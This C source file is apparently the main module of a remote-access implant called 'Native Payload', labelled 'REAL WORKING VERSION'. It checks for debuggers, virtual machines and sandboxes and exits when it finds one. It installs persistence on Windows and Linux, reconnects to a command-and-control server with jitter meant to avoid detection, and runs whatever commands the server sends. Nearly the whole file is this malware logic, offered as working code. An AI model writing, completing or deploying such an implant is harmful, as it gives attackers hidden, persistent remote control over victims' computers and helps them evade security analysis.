/*
 * Native Payload - Main Entry Point (REAL WORKING VERSION)
 * Minimal, functional C implementation
 */

#include <stdint.h>
#include <stddef.h>
#include "config.h"
#include "utils.h"
#include "commands.h"
#include "../crypto/aes.h"
#include "../network/protocol.h"

// Forward declaration
int main_payload(void);

// Global context
static connection_t g_conn = {0};

// Platform-specific entry points
#ifdef PLATFORM_WINDOWS
    #include <windows.h>
    
    void __stdcall WinMainCRTStartup() {
        ExitProcess(main_payload());
    }
    
    int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                      LPSTR lpCmdLine, int nCmdShow) {
        (void)hInstance;
        (void)hPrevInstance;
        (void)lpCmdLine;
        (void)nCmdShow;
        return main_payload();
    }
#else
    // Use main instead of _start for standard linking
    int main(int argc, char** argv) {
        (void)argc;
        (void)argv;
        return main_payload();
    }
#endif

// Anti-analysis checks
static int check_environment(void) {
#if ENABLE_ANTI_DEBUG
    if (detect_debugger()) {
        // Detected debugger - exit silently
        return 1;
    }
#endif

#if ENABLE_ANTI_VM
    if (detect_vm()) {
        // Detected VM - could exit or continue based on config
        // For now, continue but note it
    }
#endif

    if (detect_sandbox()) {
        // Detected sandbox - exit
        return 1;
    }
    
    return 0;
}

// Initialize subsystems
static int initialize(void) {
    // Initialize connection structure
    mem_set(&g_conn, 0, sizeof(g_conn));
    
    // Set server details
    const char* host = SERVER_HOST;
    uint16_t port = SERVER_PORT;
    
    // Copy host
    size_t host_len = str_len(host);
    if (host_len >= sizeof(g_conn.server_host)) {
        host_len = sizeof(g_conn.server_host) - 1;
    }
    mem_cpy(g_conn.server_host, host, host_len);
    g_conn.server_host[host_len] = '\0';
    g_conn.server_port = port;
    
    // Generate session ID
    get_random_bytes(g_conn.session_id, sizeof(g_conn.session_id));
    
    // Generate AES key
    get_random_bytes(g_conn.aes_key, sizeof(g_conn.aes_key));
    
    return 0;
}

// Main communication loop
static int communication_loop(void) {
    packet_t packet = {0};
    uint8_t response[MAX_PACKET_SIZE];
    size_t response_len;
    
    while (g_conn.connected) {
        // Receive packet
        int ret = protocol_recv_packet(&g_conn, &packet);
        if (ret != 0) {
            // Connection lost
            g_conn.connected = 0;
            break;
        }
        
        // Handle packet based on type
        switch (packet.header.type) {
            case PACKET_COMMAND:
                // Execute command
                if (packet.data_len > 0) {
                    command_id_t cmd_id = packet.data[0];
                    const uint8_t* args = packet.data + 1;
                    size_t args_len = packet.data_len - 1;
                    
                    response_len = sizeof(response);
                    ret = execute_command(cmd_id, args, args_len, 
                                        response, &response_len);
                    
                    // Send response
                    protocol_send_response(&g_conn, packet.header.sequence,
                                         response, response_len);
                }
                break;
                
            case PACKET_HEARTBEAT:
                // Send heartbeat response
                protocol_send_heartbeat(&g_conn);
                break;
                
            case PACKET_BYE:
                // Server closing connection
                g_conn.connected = 0;
                break;
                
            default:
                // Unknown packet type
                break;
        }
        
        // Free packet data
        protocol_free_packet(&packet);
    }
    
    return 0;
}

// Connection management with retry
static int establish_connection(void) {
    int retry_count = 0;
    int retry_delay = RECONNECT_DELAY;
    
    while (1) {
        // Try to connect
        int ret = protocol_connect(&g_conn, g_conn.server_host, g_conn.server_port);
        if (ret == 0) {
            // Connected successfully
            return 0;
        }
        
        // Connection failed
        retry_count++;
        
        // Wait before retry (with exponential backoff)
        sleep_ms(retry_delay);
        
        // Increase delay for next retry (max 60 seconds)
        retry_delay = retry_delay * 2;
        if (retry_delay > 60000) {
            retry_delay = 60000;
        }
        
        // Add jitter to avoid detection patterns
        retry_delay += (get_random_int() % 1000);
    }
}

// Cleanup function
static void cleanup(void) {
    if (g_conn.connected) {
        protocol_disconnect(&g_conn);
    }
    
    // Clear sensitive data
    secure_zero(&g_conn, sizeof(g_conn));
}

// Main entry point
int main_payload(void) {
    // Check for analysis/sandboxing
    if (check_environment()) {
        return 1;
    }
    
    // Initialize
    if (initialize() != 0) {
        return 1;
    }
    
    // Install persistence if enabled
#if ENABLE_PERSISTENCE
    #ifdef PLATFORM_WINDOWS
        install_persistence_windows();
    #elif defined(PLATFORM_LINUX)
        install_persistence_linux();
    #endif
#endif
    
    // Main connection loop with auto-reconnect
    while (1) {
        // Establish connection
        if (establish_connection() == 0) {
            // Run communication loop
            communication_loop();
        }
        
        // Connection lost, clean up and retry
        if (g_conn.connected) {
            protocol_disconnect(&g_conn);
            g_conn.connected = 0;
        }
        
        // Wait before reconnecting
        sleep_ms(RECONNECT_DELAY);
    }
    
    // Cleanup (normally never reached)
    cleanup();
    
    return 0;
}